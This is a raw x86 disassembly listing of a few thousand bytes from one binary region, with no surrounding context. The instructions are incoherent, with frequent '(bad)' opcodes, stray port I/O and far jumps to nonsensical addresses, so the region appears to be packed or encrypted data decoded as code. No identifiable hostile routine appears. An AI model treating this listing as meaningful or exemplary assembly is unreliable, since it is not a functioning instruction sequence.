  41f68d:	scas   al,BYTE PTR es:[edi]
  41f68e:	retf   
  41f68f:	in     eax,dx
  41f690:	mov    BYTE PTR [ebp-0x2a],ah
  41f693:	lods   al,BYTE PTR ds:[esi]
  41f694:	mov    eax,ds:0xfc4789b5
  41f699:	dec    ebp
  41f69a:	jbe    0x41f6af
  41f69c:	lock cmp BYTE PTR [ebx+0x76bbcd49],0x81
  41f6a4:	mov    ss,WORD PTR [ebx]
  41f6a6:	inc    edx
  41f6a7:	dec    esp
  41f6a8:	xor    eax,0xd085aedf
  41f6ad:	(bad)  
  41f6ae:	push   ebp
  41f6af:	shr    bh,cl
  41f6b1:	cmc    
  41f6b2:	rcr    BYTE PTR [eax+eiz*2],1
  41f6b5:	pop    ecx
  41f6b6:	scas   eax,DWORD PTR es:[edi]
  41f6b7:	sub    al,0xaf
  41f6b9:	lds    edi,FWORD PTR [edi]
  41f6bb:	adc    eax,0xbf657d0
  41f6c0:	mov    bh,bh
  41f6c2:	xchg   edx,esp
  41f6c4:	jp     0x41f69b
  41f6c6:	imul   edx,edi,0x75
  41f6c9:	sbb    edx,ecx
  41f6cb:	push   edx
  41f6cc:	adc    al,0x56
  41f6ce:	sub    ecx,edi
  41f6d0:	jg     0x41f684
  41f6d2:	pusha  
  41f6d3:	dec    ebp
  41f6d4:	pop    ebx
  41f6d5:	sbb    ch,cl
  41f6d7:	fidiv  WORD PTR [edx+0x17]
  41f6da:	dec    edx
  41f6db:	aad    0xe9
  41f6dd:	adc    al,0x7e
  41f6df:	popf   
  41f6e0:	(bad)  
  41f6e1:	cld    
  41f6e2:	inc    edi
  41f6e3:	add    esp,DWORD PTR [eax+0x79cd3211]
  41f6e9:	sbb    eax,0xd94add34
  41f6ee:	push   ecx
  41f6ef:	dec    si
  41f6f1:	and    al,0x3e
  41f6f3:	(bad)  
  41f6f5:	adc    al,0x54
  41f6f7:	jb     0x41f75b
  41f6f9:	pop    esi
  41f6fa:	mov    DWORD PTR [ecx+ebx*4],esi
  41f6fd:	and    eax,0x38988c2
  41f702:	pop    esp
  41f703:	retf   
  41f704:	mov    DWORD PTR [edx],ebx
  41f706:	fcomp  QWORD PTR [ecx+edi*1]
  41f709:	add    cl,BYTE PTR [esi-0x3d28a290]
  41f70f:	sbb    esp,DWORD PTR [ecx-0x53b4e1d4]
  41f715:	mov    ds:0xb3bc592f,al
  41f71a:	sbb    al,0xd7
  41f71c:	cs mov bh,0x4d
  41f71f:	cld    
  41f720:	mov    ds:0x8860ba2a,al
  41f725:	pop    ds
  41f726:	pop    ss
  41f727:	lock pop ecx
  41f729:	pop    ecx
  41f72a:	inc    eax
  41f72b:	dec    ebp
  41f72c:	ja     0x41f730
  41f72e:	jle    0x41f792
  41f730:	in     al,dx
  41f731:	adc    DWORD PTR [esi],esp
  41f733:	xchg   DWORD PTR ds:0x870f07bf,edi
  41f739:	call   DWORD PTR [ebx+0x66]
  41f73c:	jle    0x41f78a
  41f73e:	jg     0x41f6db
  41f740:	adc    al,0xde
  41f742:	iret   
  41f743:	stc    
  41f744:	aam    0x2
  41f746:	pop    eax
  41f747:	xchg   ebp,eax
  41f748:	push   ds
  41f749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f74a:	bound  edi,QWORD PTR [edi+0xdbba850]
  41f750:	jno    0x41f6dd
  41f752:	pusha  
  41f753:	ja     0x41f72f
  41f755:	in     al,dx
  41f756:	push   esi
  41f757:	iret   
  41f758:	aam    0xe3
  41f75a:	jns    0x41f716
  41f75c:	ret    0x13bf
  41f75f:	mov    ch,0x89
  41f761:	or     al,0x89
  41f763:	inc    ebx
  41f764:	jne    0x41f764
  41f766:	pusha  
  41f767:	sub    DWORD PTR [edx-0x71a5424e],ecx
  41f76d:	mov    ebx,0x911cd427
  41f772:	mov    ch,BYTE PTR [eax+0x343feada]
  41f778:	mov    bl,BYTE PTR [ebp+0x4c3b7b26]
  41f77e:	adc    edx,DWORD PTR [ebp+0x18]
  41f781:	adc    DWORD PTR [edi-0x2f],esp
  41f784:	lock out dx,al
  41f786:	test   eax,0xdfa2185f
  41f78b:	(bad)  
  41f78d:	enter  0xec13,0x89
  41f791:	outs   dx,DWORD PTR ds:[esi]
  41f792:	and    BYTE PTR [edx-0x24],bl
  41f795:	mov    eax,0xeb6a0cb
  41f79a:	je     0x41f780
  41f79c:	mov    edx,0xa7ebee05
  41f7a1:	pop    ss
  41f7a2:	cmp    DWORD PTR [edx-0xb],0xffffffbb
  41f7a6:	sbb    dl,bl
  41f7a8:	cld    
  41f7a9:	fucomi st,st(4)
  41f7ab:	aam    0xbe
  41f7ad:	mov    al,ds:0x1148faed
  41f7b2:	lods   eax,DWORD PTR ds:[esi]
  41f7b3:	aam    0x1f
  41f7b5:	mov    ch,0xd7
  41f7b7:	sub    dl,BYTE PTR [eax]
  41f7b9:	pusha  
  41f7ba:	jae    0x41f7d2
  41f7bc:	mov    BYTE PTR [ebx],al
  41f7be:	outs   dx,DWORD PTR ds:[esi]
  41f7bf:	dec    edx
  41f7c0:	ficomp WORD PTR [ebx-0x75]
  41f7c3:	or     ch,BYTE PTR ds:0x18babe03
  41f7c9:	jge    0x41f7ef
  41f7cb:	inc    edx
  41f7cc:	jno    0x41f78b
  41f7ce:	jl     0x41f795
  41f7d0:	add    bl,BYTE PTR [edx-0x1f]
  41f7d3:	out    0xef,eax
  41f7d5:	add    dl,BYTE PTR [edi-0x4980b7f2]
  41f7db:	aad    0xcd
  41f7dd:	jmp    0x70918aff
  41f7e2:	and    ch,BYTE PTR [eax-0x14b53472]
  41f7e8:	lods   al,BYTE PTR ds:[esi]
  41f7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7ea:	add    eax,0x19021857
  41f7ef:	aam    0x4c
  41f7f1:	std    
  41f7f2:	dec    ecx
  41f7f3:	xchg   edx,eax
  41f7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f5:	jmp    0xf9ca1942
  41f7fa:	cs std 
  41f7fc:	mov    ds:0x560b9831,eax
  41f801:	sti    
  41f802:	inc    edi
  41f803:	aam    0xad
  41f805:	ror    BYTE PTR [edx],cl
  41f807:	test   al,0x57
  41f809:	jmp    0x8eaa:0x9dc5b759
  41f810:	mov    ebp,edi
  41f812:	(bad)  
  41f813:	or     al,0x80
  41f815:	sbb    eax,0xf828f5d5
  41f81b:	lea    ecx,[edi-0x4aba074e]
  41f821:	adc    eax,0xed88c64b
  41f826:	xchg   edi,eax
  41f827:	cmp    esp,DWORD PTR ds:0xa55c34fe
  41f82d:	arpl   WORD PTR [esi],bx
  41f82f:	cs out dx,eax
  41f831:	bound  ecx,QWORD PTR [eax+0x1]
  41f834:	mov    BYTE PTR [ebx+0x22ad6b60],0x81
  41f83b:	nop
  41f83c:	push   esi
  41f83d:	and    DWORD PTR [ebx],ecx
  41f83f:	aam    0x7e
  41f841:	inc    ebp
  41f842:	test   eax,0xf1fbe38a
  41f847:	ins    DWORD PTR es:[edi],dx
  41f848:	mov    BYTE PTR [ebp+0x38],cl
  41f84b:	int3   
  41f84c:	rcr    dl,1
  41f84e:	retf   
  41f84f:	scas   eax,DWORD PTR es:[edi]
  41f850:	sub    BYTE PTR [ebx],al
  41f852:	mov    BYTE PTR [edi+ebp*8-0x5b],dh
  41f856:	daa    
  41f857:	neg    DWORD PTR [edi-0x4d]
  41f85a:	pop    ds
  41f85b:	addr16 jmp 0x41f8be
  41f85e:	jp     0x41f888
  41f860:	push   eax
  41f861:	jbe    0x41f8e1
  41f863:	aam    0xb6
  41f865:	(bad)  
  41f866:	std    
  41f867:	pop    esi
  41f868:	cmp    eax,0x97d16df4
  41f86d:	(bad)  
  41f86e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86f:	cmp    BYTE PTR [edi],dl
  41f871:	adc    BYTE PTR [ecx+ebp*2-0x7b],0xcc
  41f876:	addr16 xor eax,0xd2ef4826
  41f87c:	jmp    0xb49c:0x40700819
  41f883:	and    BYTE PTR [edi+0x49e4da9c],cl
  41f889:	xchg   ecx,eax
  41f88a:	fcmovbe st,st(3)
  41f88c:	mov    ebx,ebx
  41f88e:	cmp    al,0x34
  41f890:	call   0xc048:0x7163ebd1
  41f897:	mov    esi,0x29af02e2
  41f89c:	fdivp  st(5),st
  41f89e:	cmp    bh,BYTE PTR [ecx-0x78]
  41f8a1:	ins    DWORD PTR es:[edi],dx
  41f8a2:	jb     0x41f900
  41f8a4:	retf   0x1e0a
  41f8a7:	sub    bl,BYTE PTR [ebx+eax*1+0x3a]
  41f8ab:	or     ch,ah
  41f8ad:	inc    esi
  41f8ae:	js     0x41f884
  41f8b0:	inc    ebp
  41f8b1:	rcr    DWORD PTR [edi],0xb
  41f8b4:	(bad)  
  41f8b5:	jo     0x41f8f1
  41f8b7:	dec    edi
  41f8b8:	call   0x13166eb0
  41f8bd:	cmc    
  41f8be:	add    bh,BYTE PTR [ecx-0x4]
  41f8c1:	or     edx,DWORD PTR [esi]
  41f8c3:	xchg   ebp,eax
  41f8c4:	mov    DWORD PTR [ebp+0x74907c06],eax
  41f8ca:	add    eax,0x202be51
  41f8cf:	inc    ecx
  41f8d0:	neg    esp
  41f8d2:	lods   al,BYTE PTR ds:[esi]
  41f8d3:	adc    cl,BYTE PTR [ebx]
  41f8d5:	jle    0x41f925
  41f8d7:	aam    0x89
  41f8d9:	push   edi
  41f8da:	xchg   DWORD PTR [ebp-0x32],edi
  41f8dd:	cmp    BYTE PTR [ecx+esi*8+0x2282058c],ch
  41f8e4:	jno    0x41f931
  41f8e6:	adc    eax,0x1f6734f2
  41f8eb:	mov    DWORD PTR [edx+0x16a48860],eax
  41f8f1:	test   bh,0xab
  41f8f4:	xor    BYTE PTR [edx+0x56],ch
  41f8f7:	repz fidiv DWORD PTR [ebp+edx*2+0x131571b5]
  41f8ff:	or     al,0x89
  41f901:	mov    ecx,0xd85e9d00
  41f906:	in     eax,0x84
  41f908:	in     al,dx
  41f909:	add    ch,BYTE PTR [eax-0x5b17fe85]
  41f90f:	daa    
  41f910:	rcl    bl,cl
  41f912:	pusha  
  41f913:	ins    DWORD PTR es:[edi],dx
  41f914:	xlat   BYTE PTR ds:[ebx]
  41f915:	lahf   
  41f916:	mov    eax,ds:0x69a4c2f6
  41f91b:	scas   eax,DWORD PTR es:[edi]
  41f91c:	xchg   DWORD PTR [ecx+edx*8],esp
  41f91f:	jo     0x41f94c
  41f921:	cwde   
  41f922:	adc    dl,bh
  41f924:	ins    BYTE PTR es:[edi],dx
  41f925:	fisubr DWORD PTR [edx-0x74727667]
  41f92b:	inc    esi
  41f92c:	pop    ebp
  41f92d:	jl     0x41f8f3
  41f92f:	xor    ah,dl
  41f931:	push   0xffffffc0
  41f933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f934:	add    BYTE PTR [ebx],al
  41f936:	jp     0x41f92d
  41f938:	and    DWORD PTR [ebx-0x6f],edi
  41f93b:	mov    DWORD PTR fs:[ecx+0x58],edi
  41f93f:	or     DWORD PTR [ebx-0x626501d6],edi
  41f945:	add    cl,BYTE PTR [esi+eiz*8+0x7f2ccfe2]
  41f94c:	xchg   BYTE PTR [ebp+0x20c8ef1f],dl
  41f952:	retf   0xa6bd
  41f955:	mov    dl,0x3
  41f957:	mov    eax,0xdca6d03b
  41f95c:	ja     0x41f97a
  41f95e:	fwait
  41f95f:	xchg   BYTE PTR [eax],ch
  41f961:	lods   al,BYTE PTR ds:[esi]
  41f962:	jg     0x41f9b4
  41f964:	push   ss
  41f965:	jl     0x41f969
  41f967:	fisttp DWORD PTR [ecx-0x4ae8dcd9]
  41f96d:	mov    esi,0x4d95f196
  41f972:	jle    0x41f978
  41f974:	mov    dh,0x85
  41f976:	fisub  DWORD PTR [ebp+0x2a]
  41f979:	cmp    al,ah
  41f97b:	xchg   esi,eax
  41f97c:	mov    DWORD PTR [edi],ecx
  41f97e:	je     0x41f9bd
  41f980:	mov    esi,0x6cb25f56
  41f985:	sbb    edx,eax
  41f987:	ins    BYTE PTR es:[edi],dx
  41f988:	or     BYTE PTR ds:[edi+0x1445f355],ch
  41f98f:	xchg   BYTE PTR [eax+0x6adf8765],cl
  41f995:	fxch   st(5)
  41f997:	xchg   edi,eax
  41f998:	lahf   
  41f999:	sub    eax,0x478f3d10
  41f99e:	push   edx
  41f99f:	fisttp DWORD PTR [ecx-0x64677d13]
  41f9a5:	xor    bl,dl
  41f9a7:	and    al,BYTE PTR gs:[edx]
  41f9aa:	xchg   BYTE PTR ds:0x1d076c4d,ah
  41f9b0:	mov    bl,BYTE PTR [ebx]
  41f9b2:	stos   DWORD PTR es:[edi],eax
  41f9b3:	mov    cl,0x8e
  41f9b5:	aaa    
  41f9b6:	pop    ds
  41f9b7:	pop    ds
  41f9b8:	aam    0x6d
  41f9ba:	es pop ebx
  41f9bc:	lock int 0x75
  41f9bf:	mov    ds:0x71d1c989,al
  41f9c4:	cmp    DWORD PTR [esi+ebp*2],edi
  41f9c7:	push   ds
  41f9c8:	lea    ebp,[edi-0x6b243f28]
  41f9ce:	clc    
  41f9cf:	pop    ss
  41f9d0:	aaa    
  41f9d1:	fbld   TBYTE PTR [edi]
  41f9d3:	xchg   ebx,eax
  41f9d4:	fild   WORD PTR ds:0x78302e36
  41f9da:	jl     0x41fa29
  41f9dc:	or     dh,BYTE PTR [edi+ebx*1]
  41f9df:	inc    ebx
  41f9e0:	xor    esp,edx
  41f9e2:	int    0x47
  41f9e4:	call   0x1d17b342
  41f9e9:	loope  0x41f9ec
  41f9eb:	push   ebx
  41f9ec:	cmp    ebx,DWORD PTR [edx]
  41f9ee:	les    eax,FWORD PTR fs:[esi-0x5dc59641]
  41f9f5:	add    edi,DWORD PTR [esi]
  41f9f7:	mov    ah,0x5e
  41f9f9:	and    eax,0x9ea6d703
  41f9fe:	js     0x41fa48
  41fa00:	fisub  WORD PTR [esi+0x4788be82]
  41fa06:	pushf  
  41fa07:	in     al,0x11
  41fa09:	inc    edx
  41fa0a:	jnp    0x41fa7c
  41fa0c:	mov    ecx,0xfd208dfa
  41fa11:	gs xchg ebx,eax
  41fa13:	pop    ds
  41fa14:	mov    BYTE PTR [ebp-0x33b0e94e],dl
  41fa1a:	fs push edx
  41fa1c:	mov    ebx,0xc78eac03
  41fa21:	loope  0x41fa10
  41fa23:	and    al,0x4c
  41fa25:	retf   0x2f06
  41fa28:	mov    BYTE PTR [ebx+0x4c5b7dda],al
  41fa2e:	mov    ebx,0xc4ee4adf
  41fa33:	aad    0x2
  41fa35:	mov    DWORD PTR [edx+0x72],esi
  41fa38:	lock mov ch,BYTE PTR [ebp+0x31]
  41fa3c:	mov    bh,ah
  41fa3e:	or     al,BYTE PTR [ecx+ebp*1]
  41fa41:	push   esi
  41fa42:	sbb    BYTE PTR [edi],ah
  41fa44:	mov    DWORD PTR ds:0x888365f4,0x3582ca15
  41fa4e:	pop    ds
  41fa4f:	adc    eax,0x8d7c7b65
  41fa54:	jge    0x41fa7e
  41fa56:	mov    edx,0x60d9c543
  41fa5b:	out    0xfa,al
  41fa5d:	add    dl,BYTE PTR [edi-0x7a]
  41fa60:	xor    eax,0xffe814ab
  41fa65:	stc    
  41fa66:	hlt    
  41fa67:	cwde   
  41fa68:	test   eax,0xcb6c9f04
  41fa6d:	in     eax,dx
  41fa6e:	loop   0x41fa69
  41fa70:	into   
  41fa71:	jmp    0x7f94:0x1917cc3e
  41fa78:	mov    eax,ds:0x97aad174
  41fa7d:	add    dh,BYTE PTR [edi+eax*2+0x34]
  41fa81:	test   BYTE PTR [eax-0x4f],ah
  41fa84:	aas    
  41fa85:	out    dx,eax
  41fa86:	rcl    DWORD PTR ds:[edx+0x4e],cl
  41fa8a:	push   esp
  41fa8b:	xlat   BYTE PTR ds:[ebx]
  41fa8c:	out    0xcb,eax
  41fa8e:	mov    cl,bh
  41fa90:	add    al,0xac
  41fa92:	mov    WORD PTR [edi+ebx*2+0x251608f],ss
  41fa99:	mov    WORD PTR [ebx-0x55],fs
  41fa9c:	adc    cl,dl
  41fa9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa9f:	aad    0x32
  41faa1:	mov    ds:0x45617843,al
  41faa6:	fs sub al,0x89
  41faa9:	rol    DWORD PTR [esi-0x7b],1
  41faac:	cmp    ebx,DWORD PTR [eax+0x5c4337d]
  41fab2:	add    BYTE PTR [ebp+0x5c],dh
  41fab5:	js     0x41fab9
  41fab7:	les    esi,FWORD PTR [ecx+ebp*8-0x2c77b8fc]
  41fabe:	cmp    eax,0x569e87c1
  41fac3:	mov    al,ds:0xc9d605a3
  41fac8:	mov    eax,ds:0xe162b61f
  41facd:	fadd   st,st(0)
  41facf:	ins    DWORD PTR es:[edi],dx
  41fad0:	test   al,0x48
  41fad2:	pop    ds
  41fad3:	inc    ebx
  41fad4:	push   ebp
  41fad5:	add    eax,DWORD PTR [ebx-0x5b00adec]
  41fadb:	aad    0x37
  41fadd:	aaa    
  41fade:	lods   al,BYTE PTR ds:[esi]
  41fadf:	loope  0x41fade
  41fae1:	popf   
  41fae2:	icebp  
  41fae3:	add    BYTE PTR [edi-0x426732af],0x8f
  41faea:	jg     0x41fa93
  41faec:	jbe    0x41fb4e
  41faee:	xor    edx,edi
  41faf0:	or     BYTE PTR [ecx],bl
  41faf2:	std    
  41faf3:	xchg   ebp,eax
  41faf4:	mov    eax,ds:0xfc76796c
  41faf9:	sbb    ecx,DWORD PTR [edx-0x22de4345]
  41faff:	jns    0x41fae3
  41fb01:	pop    ds
  41fb02:	xchg   ecx,eax
  41fb03:	or     ebx,ebp
  41fb05:	dec    edi
  41fb06:	add    DWORD PTR [esi+ecx*4+0x79d5f38b],eax
  41fb0d:	clc    
  41fb0e:	in     al,0xbb
  41fb10:	sub    eax,0xb5add5f1
  41fb15:	and    eax,0x5539e137
  41fb1a:	mov    ds:0x501a12f5,al
  41fb1f:	inc    ebp
  41fb20:	cwde   
  41fb21:	pop    es
  41fb22:	add    DWORD PTR [ebx+eax*1-0x4a],edx
  41fb26:	dec    edi
  41fb27:	ror    BYTE PTR [eax+0x29cbeffd],cl
  41fb2d:	call   DWORD PTR [edx]
  41fb2f:	sub    BYTE PTR [ebp+0x1],al
  41fb32:	data16 mov bh,0x40
  41fb35:	fild   QWORD PTR [ecx+0x1f]
  41fb38:	sbb    al,0xdb
  41fb3a:	enter  0x88d3,0x43
  41fb3e:	mov    WORD PTR [ebx],ds
  41fb40:	lds    edi,FWORD PTR fs:[bp-0x2c]
  41fb45:	in     eax,0xfd
  41fb47:	aad    0xd
  41fb49:	push   ecx
  41fb4a:	push   0x76a38c4f
  41fb4f:	push   0xfffffffd
  41fb51:	test   eax,0x62439536
  41fb56:	pop    ds
  41fb57:	mov    ecx,0x72f932d5
  41fb5c:	push   ds
  41fb5d:	xor    al,bh
  41fb5f:	rcr    BYTE PTR [esi+0x219ece0d],cl
  41fb65:	and    edx,esi
  41fb67:	clc    
  41fb68:	or     BYTE PTR [edx+0x18],al
  41fb6b:	push   esi
  41fb6c:	xchg   ch,dl
  41fb6e:	daa    
  41fb6f:	aad    0x24
  41fb71:	sbb    bh,bl
  41fb73:	add    al,0x84
  41fb75:	cmp    edi,DWORD PTR [edi-0x7c58542c]
  41fb7b:	dec    edx
  41fb7c:	push   esp
  41fb7d:	sbb    BYTE PTR [ecx+esi*2],al
  41fb80:	icebp  
  41fb81:	popf   
  41fb82:	ret    0xcdd4
  41fb85:	in     eax,0x37
  41fb87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb88:	fdiv   st,st(1)
  41fb8a:	mov    ah,0xaa
  41fb8c:	add    al,0x6
  41fb8e:	bound  edi,QWORD PTR [eax-0x36b05ddd]
  41fb94:	into   
  41fb95:	inc    eax
  41fb96:	push   ds
  41fb97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb98:	push   ebp
  41fb99:	pop    edx
  41fb9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb9b:	xchg   edi,eax
  41fb9c:	and    BYTE PTR [ebx-0x17552a02],ah
  41fba2:	out    dx,al
  41fba3:	ins    DWORD PTR es:[edi],dx
  41fba4:	test   al,0xf4
  41fba6:	into   
  41fba7:	jae    0x41fb32
  41fba9:	mov    cl,0x2f
  41fbab:	push   cs
  41fbac:	call   0x9495e38
  41fbb1:	sbb    eax,0xaba88a2
  41fbb6:	push   ebp
  41fbb7:	cwde   
  41fbb8:	cwde   
  41fbb9:	mov    al,ds:0xcd44fbe0
  41fbbe:	arpl   WORD PTR [ebx+0x30cac38],si
  41fbc4:	mov    ah,0xc2
  41fbc6:	fldcw  WORD PTR [ecx]
  41fbc8:	xor    eax,0x5e6ff202
  41fbcd:	sub    bl,BYTE PTR ds:0x1fc4f548
  41fbd3:	test   eax,0x3323c20a
  41fbd8:	fimul  WORD PTR [ebx+edi*2+0x139179a7]
  41fbdf:	test   BYTE PTR [eax-0x677c6d91],0xa3
  41fbe6:	pop    es
  41fbe7:	shl    ah,cl
  41fbe9:	pop    ss
  41fbea:	imul   edx,esp,0x357b7d5c
  41fbf0:	test   DWORD PTR [esi+0x38],0x1e7a6c5a
  41fbf7:	mov    ds:0x29c513af,eax
  41fbfc:	fsubr  DWORD PTR [edx-0x597cbc9f]
  41fc02:	push   ecx
  41fc03:	cli    
  41fc04:	mov    dh,0xa6
  41fc06:	xor    BYTE PTR [ecx-0x6f],cl
  41fc09:	xchg   DWORD PTR ds:0x441288e1,ecx
  41fc0f:	aas    
  41fc10:	loop   0x41fc07
  41fc12:	jmp    0x41fc50
  41fc14:	mov    DWORD PTR [ebx-0x78976774],ecx
  41fc1a:	pop    edx
  41fc1b:	jne    0x41fc93
  41fc1d:	add    edi,DWORD PTR [esi+0x71]
  41fc20:	arpl   bp,di
  41fc22:	cwde   
  41fc23:	lock mov edi,0x89fe12ce
  41fc29:	or     eax,0xafe62638
  41fc2e:	test   eax,0xde05cd38
  41fc33:	fistp  WORD PTR [eax-0x1e]
  41fc36:	les    ebp,FWORD PTR [eax+0x6f]
  41fc39:	out    0x66,eax
  41fc3b:	mov    ebp,DWORD PTR [ebp-0x517f0193]
  41fc41:	xor    eax,0x3f90f9
  41fc46:	xor    al,0xbf
  41fc48:	(bad)  
  41fc49:	pushf  
  41fc4a:	outs   dx,BYTE PTR ds:[esi]
  41fc4b:	cmp    eax,0x2abf8e80
  41fc50:	enter  0xcc4b,0x68
  41fc54:	fld    QWORD PTR [ebp-0x14cf69d]
  41fc5a:	or     esi,ebp
  41fc5c:	mov    DWORD PTR [ebp+0x64],ebp
  41fc5f:	sbb    DWORD PTR [ebx-0xf363d6],eax
  41fc65:	jb     0x41fc65
  41fc67:	jno    0x41fbff
  41fc69:	sbb    ah,BYTE PTR ds:0x70e9489b
  41fc6f:	repz dec esp
  41fc71:	and    edx,DWORD PTR [ecx-0x45fcda2f]
  41fc77:	gs inc esi
  41fc79:	push   edi
  41fc7a:	arpl   WORD PTR [edi+eax*8],ax
  41fc7d:	add    eax,0x7bb4086c
  41fc82:	ret    
  41fc83:	xchg   edi,eax
  41fc84:	and    BYTE PTR ds:0x28db9d7a,bl
  41fc8a:	mov    cl,0x55
  41fc8c:	mov    ebx,0xa54b3e06
  41fc91:	add    dh,BYTE PTR [edx+0x3b]
  41fc94:	mov    ah,ch
  41fc96:	(bad)  [eax+0x62]
  41fc99:	int3   
  41fc9a:	pusha  
  41fc9b:	jae    0x41fc4e
  41fc9d:	imul   BYTE PTR [edi]
  41fc9f:	nop
  41fca0:	or     ch,BYTE PTR [ecx]
  41fca2:	stos   DWORD PTR es:[edi],eax
  41fca3:	aad    0xd7
  41fca5:	(bad)  
  41fca6:	jecxz  0x41fcec
  41fca8:	sub    DWORD PTR [ebp-0x6c4bf21f],edi
  41fcae:	leave  
  41fcaf:	aaa    
  41fcb0:	or     DWORD PTR [edx],edx
  41fcb2:	mov    dl,0x6c
  41fcb4:	jle    0x41fc89
  41fcb6:	sbb    edx,edi
  41fcb8:	out    dx,eax
  41fcb9:	mov    ds:0x1437feb,al
  41fcbe:	xor    eax,0x41379731
  41fcc3:	adc    ecx,DWORD PTR [edx+0x42]
  41fcc6:	add    al,0xd9
  41fcc8:	in     al,dx
  41fcc9:	add    eax,edi
  41fccb:	stos   BYTE PTR es:[edi],al
  41fccc:	(bad)  
  41fccd:	jns    0x41fc80
  41fccf:	cmp    bl,BYTE PTR [esi]
  41fcd1:	mov    esp,0x5cc91dc6
  41fcd6:	out    0xe0,al
  41fcd8:	mov    BYTE PTR [ecx-0x74af886d],al
  41fcde:	in     eax,dx
  41fcdf:	mov    DWORD PTR [edi+edi*1],ecx
  41fce2:	neg    bl
  41fce4:	jb     0x41fd30
  41fce6:	fs aad 0x6b
  41fce9:	inc    ecx
  41fcea:	jge    0x41fcc7
  41fcec:	adc    BYTE PTR [ecx],dl
  41fcee:	dec    esi
  41fcef:	jp     0x41fceb
  41fcf1:	mov    ch,0xfd
  41fcf3:	aad    0x62
  41fcf5:	or     eax,0xb68604b3
  41fcfa:	retf   0x9d4
  41fcfd:	das    
  41fcfe:	xlat   BYTE PTR ds:[ebx]
  41fcff:	pop    es
  41fd00:	js     0x41fcf1
  41fd02:	pusha  
  41fd03:	add    BYTE PTR [ecx+0x20af0877],cl
  41fd09:	push   ebx
  41fd0a:	add    cl,BYTE PTR [eax+eiz*4+0x2984202]
  41fd11:	inc    eax
  41fd12:	fstp   TBYTE PTR [eax]
  41fd14:	inc    edi
  41fd15:	adc    DWORD PTR [esi],ebx
  41fd17:	adc    esp,DWORD PTR [ebx]
  41fd19:	xor    DWORD PTR [edi-0x60734d15],ebx
  41fd1f:	aam    0x13
  41fd21:	sbb    eax,0x383652e7
  41fd26:	ficomp WORD PTR [ebp+0x4d]
  41fd29:	test   DWORD PTR [eax-0x59],esp
  41fd2c:	push   ebx
  41fd2d:	idiv   dh
  41fd2f:	out    dx,eax
  41fd30:	jl     0x41fd5e
  41fd32:	jg     0x41fd08
  41fd34:	scas   eax,DWORD PTR es:[edi]
  41fd35:	add    edi,edi
  41fd37:	xchg   BYTE PTR [ecx-0x24],bh
  41fd3a:	lods   eax,DWORD PTR ds:[esi]
  41fd3b:	pop    ds
  41fd3c:	(bad)  
  41fd3d:	xor    DWORD PTR [ebx-0x73856877],edi
  41fd43:	mov    ah,0x76
  41fd45:	ins    DWORD PTR es:[edi],dx
  41fd46:	adc    esi,ecx
  41fd48:	call   0x2316600e
  41fd4d:	jge    0x41fdcb
  41fd4f:	mov    bl,0xaa
  41fd51:	call   0x95ca8841
  41fd56:	inc    eax
  41fd57:	mov    esi,0x921391ff
  41fd5c:	add    bh,BYTE PTR fs:[esi]
  41fd5f:	push   edx
  41fd60:	or     esp,DWORD PTR [ecx]
  41fd62:	scas   al,BYTE PTR es:[edi]
  41fd63:	js     0x41fddf
  41fd65:	pop    ecx
  41fd66:	pop    ds
  41fd67:	mov    DWORD PTR [ebp+eax*8-0x6f095835],ecx
  41fd6e:	mov    eax,0xfec6b5d4
  41fd73:	lds    ebx,FWORD PTR [ebx]
  41fd75:	fs mov esp,0x4e7d8952
  41fd7b:	retf   0xb5b1
  41fd7e:	imul   ecx,DWORD PTR [eax-0x31ebb8af],0x661382c7
  41fd88:	in     al,0xb1
  41fd8a:	cmp    bh,bl
  41fd8c:	mov    BYTE PTR [edi-0x73],al
  41fd8f:	dec    ebp
  41fd90:	rol    edx,cl
  41fd92:	jae    0x41fdaa
  41fd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd95:	add    eax,0x5735826c
  41fd9a:	adc    ebx,DWORD PTR [ecx-0x729d2956]
  41fda0:	inc    esi
  41fda1:	mov    ebp,0x3293dcda
  41fda6:	shrd   esi,esi,cl
  41fda9:	inc    esi
  41fdaa:	and    bl,BYTE PTR [edi+0x11ce9cf1]
  41fdb0:	sbb    eax,0x48c10e64
  41fdb5:	xor    al,0x1f
  41fdb7:	cmc    
  41fdb8:	pop    ebx
  41fdb9:	repz jnp 0x41fd58
  41fdbc:	stos   BYTE PTR es:[edi],al
  41fdbd:	aas    
  41fdbe:	xchg   esi,eax
  41fdbf:	aad    0xdb
  41fdc1:	ficomp DWORD PTR [edi+edi*4]
  41fdc4:	xchg   DWORD PTR [esi+0x1],ecx
  41fdc7:	mov    DWORD PTR es:[edi+0x788c48d4],edi
  41fdce:	mov    esi,0x32025c7e
  41fdd3:	jge    0x41fdf5
  41fdd5:	sbb    edx,eax
  41fdd7:	test   eax,0xab1e5a93
  41fddc:	xor    ah,BYTE PTR [ecx+0x3bedd759]
  41fde2:	imul   esi,DWORD PTR [ebp-0x3db5fa30],0x6020e481
  41fdec:	or     ch,al
  41fdee:	pusha  
  41fdef:	sbb    esi,0x977b64e6
  41fdf5:	inc    eax
  41fdf6:	sbb    eax,DWORD PTR [eax-0x8]
  41fdf9:	sub    ebx,DWORD PTR [esi]
  41fdfb:	jns    0x41fe1a
  41fdfd:	ss jecxz 0x41fe68
  41fe00:	daa    
  41fe01:	les    ebp,FWORD PTR [esi-0x13]
  41fe04:	lods   al,BYTE PTR ds:[esi]
  41fe05:	push   ebx
  41fe06:	ds mov ah,0xde
  41fe09:	mov    edx,0x9d14d5e1
  41fe0e:	mov    ebp,0x7d7b8cfe
  41fe13:	lahf   
  41fe14:	outs   dx,BYTE PTR ds:[esi]
  41fe15:	shl    BYTE PTR [edi+0x65ed8352],1
  41fe1b:	test   DWORD PTR [edx-0x5328f766],edx
  41fe21:	daa    
  41fe22:	mov    BYTE PTR [bx+di-0x54],bl
  41fe26:	dec    esi
  41fe27:	test   DWORD PTR [edi+0x12bd5303],0x306dbfd8
  41fe31:	jmp    0x4c68d56d
